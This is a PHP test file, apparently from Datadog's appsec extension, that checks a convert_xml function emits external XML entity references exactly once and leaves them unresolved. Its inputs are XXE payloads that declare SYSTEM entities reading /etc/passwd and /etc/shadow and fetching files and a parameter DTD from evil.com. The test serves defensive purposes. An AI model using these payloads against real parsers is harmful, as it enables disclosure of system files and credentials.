--TEST--
_convert_xml function: external entities should not be double-emitted
--DESCRIPTION--
This test verifies that external entities are emitted exactly once as literal
references, not twice. A bug could occur if _sax_get_entity emits the literal
reference AND returns NULL, causing libxml2 to also invoke _sax_reference which
would emit the reference a second time.
--FILE--
<?php
// Test 1: Single external SYSTEM entity
$xml1 = <<<XML
<!DOCTYPE root [
    <!ENTITY ext SYSTEM "http://evil.com/xxe.txt">
]>
<root>&ext;</root>
XML;

$result1 = datadog\appsec\testing\convert_xml($xml1, "application/xml");
echo "Test 1 - SYSTEM entity:\n";
echo json_encode($result1, JSON_PRETTY_PRINT) . "\n\n";

// Verify the entity reference appears exactly once
$content = $result1['root'][0] ?? '';
$count = substr_count($content, '&ext;');
echo "Entity reference count in output: $count\n";
if ($count === 1) {
    echo "PASS: External entity emitted exactly once\n";
} else {
    echo "FAIL: External entity emitted $count times (expected 1)\n";
}
echo "\n";

// Test 2: Multiple external entities in sequence
$xml2 = <<<XML
<!DOCTYPE root [
    <!ENTITY e1 SYSTEM "/etc/passwd">
    <!ENTITY e2 SYSTEM "/etc/shadow">
]>
<root>&e1;&e2;</root>
XML;

$result2 = datadog\appsec\testing\convert_xml($xml2, "application/xml");
echo "Test 2 - Multiple SYSTEM entities:\n";
echo json_encode($result2, JSON_PRETTY_PRINT) . "\n\n";

$content2 = $result2['root'][0] ?? '';
$count_e1 = substr_count($content2, '&e1;');
$count_e2 = substr_count($content2, '&e2;');
echo "Entity &e1; count: $count_e1\n";
echo "Entity &e2; count: $count_e2\n";
if ($count_e1 === 1 && $count_e2 === 1) {
    echo "PASS: Both external entities emitted exactly once\n";
} else {
    echo "FAIL: Entities emitted incorrect number of times\n";
}
echo "\n";

// Test 3: External entity with surrounding text
$xml3 = <<<XML
<!DOCTYPE root [
    <!ENTITY external SYSTEM "file:///etc/passwd">
]>
<root>before&external;after</root>
XML;

$result3 = datadog\appsec\testing\convert_xml($xml3, "application/xml");
echo "Test 3 - External entity with surrounding text:\n";
echo json_encode($result3, JSON_PRETTY_PRINT) . "\n\n";

$content3 = $result3['root'][0] ?? '';
$count_ext = substr_count($content3, '&external;');
echo "Entity &external; count: $count_ext\n";
if ($count_ext === 1) {
    echo "PASS: External entity emitted exactly once\n";
} else {
    echo "FAIL: External entity emitted $count_ext times\n";
}
echo "\n";

// Test 4: External parameter entity (different entity type)
$xml4 = <<<XML
<!DOCTYPE root [
    <!ENTITY % param SYSTEM "http://evil.com/param.dtd">
    <!ENTITY ext SYSTEM "http://evil.com/ext.txt">
]>
<root>&ext;</root>
XML;

$result4 = datadog\appsec\testing\convert_xml($xml4, "application/xml");
echo "Test 4 - With parameter entity declaration:\n";
echo json_encode($result4, JSON_PRETTY_PRINT) . "\n\n";

$content4 = $result4['root'][0] ?? '';
$count4 = substr_count($content4, '&ext;');
echo "Entity reference count: $count4\n";
if ($count4 === 1) {
    echo "PASS: External entity emitted exactly once\n";
} else {
    echo "FAIL: External entity emitted $count4 times\n";
}

--EXPECT--
Test 1 - SYSTEM entity:
{
    "root": [
        "&ext;"
    ]
}

Entity reference count in output: 1
PASS: External entity emitted exactly once

Test 2 - Multiple SYSTEM entities:
{
    "root": [
        "&e1;&e2;"
    ]
}

Entity &e1; count: 1
Entity &e2; count: 1
PASS: Both external entities emitted exactly once

Test 3 - External entity with surrounding text:
{
    "root": [
        "before&external;after"
    ]
}

Entity &external; count: 1
PASS: External entity emitted exactly once

Test 4 - With parameter entity declaration:
{
    "root": [
        "&ext;"
    ]
}

Entity reference count: 1
PASS: External entity emitted exactly once
